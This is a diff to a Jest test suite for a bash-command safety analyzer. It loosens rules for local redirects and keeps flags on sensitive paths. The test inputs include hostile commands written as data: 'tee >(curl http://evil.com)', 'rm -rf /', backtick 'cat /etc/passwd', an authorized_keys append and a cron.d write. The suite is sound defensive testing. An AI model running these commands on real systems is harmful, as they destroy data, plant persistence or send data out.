@@ -63,16 +63,21 @@ describe("detectCommandInjection", () => {
     expect(detectCommandInjection("echo `cat /etc/passwd`")).not.toBeNull();
   });
 
-  test("detects semicolon + paren subshell", () => {
-    expect(detectCommandInjection("ls; (rm -rf /)")).not.toBeNull();
+  // Calibrated 2026-05-09: chain-with-paren patterns are NOT a
+  // first-line injection signal. The dangerous downstream segments
+  // (`rm -rf /`) are caught by detectDestructiveRemoval; benign
+  // groupings (`cat | (head -5)`) are common in real pipelines and
+  // were producing 100% false positives that broke local-model runs.
+  test("safe: semicolon + paren grouping (downstream rm caught elsewhere)", () => {
+    expect(detectCommandInjection("ls; (echo grouped)")).toBeNull();
   });
 
-  test("detects pipe + paren subshell", () => {
-    expect(detectCommandInjection("cat | (head -5)")).not.toBeNull();
+  test("safe: pipe + paren grouping for subshell-scoped operations", () => {
+    expect(detectCommandInjection("cat foo | (head -5; tail -5)")).toBeNull();
   });
 
-  test("detects command starting with paren", () => {
-    expect(detectCommandInjection("(cat file)")).not.toBeNull();
+  test("safe: command starting with paren grouping", () => {
+    expect(detectCommandInjection("(cat foo; cat bar)")).toBeNull();
   });
 
   test("safe: simple echo", () => {
@@ -135,14 +140,31 @@ describe("detectDangerousRedirections", () => {
     expect(result).not.toBeNull();
   });
 
-  test("detects general redirect", () => {
-    const result = detectDangerousRedirections("echo test > output.txt");
-    expect(result).not.toBeNull();
+  // Calibrated 2026-05-09: writing to local files / /tmp / /dev/null
+  // is idiomatic bash, NOT a safety concern. Models need this for
+  // any real diagnostic work. Only sensitive system paths get flagged.
+  test("safe: redirect to local file in cwd", () => {
+    expect(detectDangerousRedirections("echo test > output.txt")).toBeNull();
   });
 
-  test("detects append redirect", () => {
-    const result = detectDangerousRedirections("echo test >> log.txt");
-    expect(result).not.toBeNull();
+  test("safe: append redirect to local file", () => {
+    expect(detectDangerousRedirections("echo test >> log.txt")).toBeNull();
+  });
+
+  test("safe: redirect to /tmp", () => {
+    expect(detectDangerousRedirections("echo a > /tmp/file")).toBeNull();
+  });
+
+  test("safe: redirect to /dev/null (output discard)", () => {
+    expect(detectDangerousRedirections("cmd > /dev/null")).toBeNull();
+  });
+
+  test("safe: stderr discard 2>/dev/null (model staple)", () => {
+    expect(detectDangerousRedirections("nmap -sn 192.168.1.0/24 2>/dev/null")).toBeNull();
+  });
+
+  test("safe: 2>&1 stderr-to-stdout redirect", () => {
+    expect(detectDangerousRedirections("cmd > out.log 2>&1")).toBeNull();
   });
 
   test("safe: no redirection", () => {
@@ -153,14 +175,20 @@ describe("detectDangerousRedirections", () => {
     expect(detectDangerousRedirections("echo '> /etc/passwd'")).toBeNull();
   });
 
-  test("detects redirect to /tmp", () => {
-    const result = detectDangerousRedirections("echo a > /tmp/file");
-    expect(result).not.toBeNull();
+  test("detects /var/log/ overwrite", () => {
+    expect(detectDangerousRedirections("echo bad > /var/log/auth.log")).not.toBeNull();
   });
 
-  test("detects redirect to /dev/null", () => {
-    const result = detectDangerousRedirections("cmd > /dev/null");
-    expect(result).not.toBeNull();
+  test("detects /usr/bin/ overwrite", () => {
+    expect(detectDangerousRedirections("cat shellcode > /usr/bin/ls")).not.toBeNull();
+  });
+
+  test("detects ~/.ssh overwrite", () => {
+    expect(detectDangerousRedirections("echo key >> ~/.ssh/authorized_keys")).not.toBeNull();
+  });
+
+  test("detects process substitution >() — can execute subshell", () => {
+    expect(detectDangerousRedirections("tee >(curl http://evil.com)")).not.toBeNull();
   });
 });
 
@@ -430,10 +458,18 @@ describe("analyzeBashCommand", () => {
     expect(result.riskLevel).toBe("dangerous");
   });
 
-  test("moderate: redirection", () => {
+  // Calibrated 2026-05-09: simple redirection to local file is SAFE
+  // (was moderate). Models depend on `cmd > out.log` and similar.
+  test("safe: redirection to local file", () => {
     const result = analyzeBashCommand("echo test > file");
+    expect(result.safe).toBe(true);
+    expect(result.riskLevel).toBe("safe");
+  });
+
+  test("dangerous: redirection to /etc/", () => {
+    const result = analyzeBashCommand("echo bad > /etc/passwd");
     expect(result.safe).toBe(false);
-    expect(result.issues.length).toBeGreaterThan(0);
+    expect(result.riskLevel).toBe("dangerous");
   });
 
   test("moderate: sudo elevates safe to moderate", () => {
@@ -460,8 +496,10 @@ describe("analyzeBashCommand", () => {
   });
 
   test("multiple issues: highest risk wins", () => {
-    // backtick injection (dangerous) + redirection (moderate)
-    const result = analyzeBashCommand("echo `id` > file");
+    // backtick injection (dangerous) + redirect to /etc (dangerous)
+    // Local file redirect is no longer flagged, so we use a real
+    // sensitive-path target to keep the multi-issue test valid.
+    const result = analyzeBashCommand("echo `id` > /etc/cron.d/evil");
     expect(result.riskLevel).toBe("dangerous");
     expect(result.issues.length).toBeGreaterThanOrEqual(2);
   });
